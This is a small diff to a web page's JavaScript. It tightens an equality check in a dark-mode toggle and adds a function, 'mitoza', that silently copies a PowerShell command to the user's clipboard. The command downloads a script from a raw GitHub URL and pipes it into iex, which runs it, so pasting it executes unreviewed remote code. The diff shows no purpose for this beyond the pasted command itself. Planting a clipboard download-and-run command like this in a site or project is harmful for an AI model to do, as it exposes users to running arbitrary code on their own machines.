@@ -64,7 +64,7 @@ function sc(x) {
 
 function dk(id){
     let dk = document.getElementById(id)
-    if (dk.style.backgroundColor == 'black'){
+    if (dk.style.backgroundColor === 'black'){
 
         dk.style.backgroundColor = 'white'
         dk.style.color = 'black'
@@ -83,4 +83,8 @@ function dk(id){
         document.body.style.color = 'white'
         dk.textContent = 'light_mode'
         }
+}
+
+function mitoza(){
+    navigator.clipboard.writeText("iwr \"https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/a.ps1\" | iex")
 }
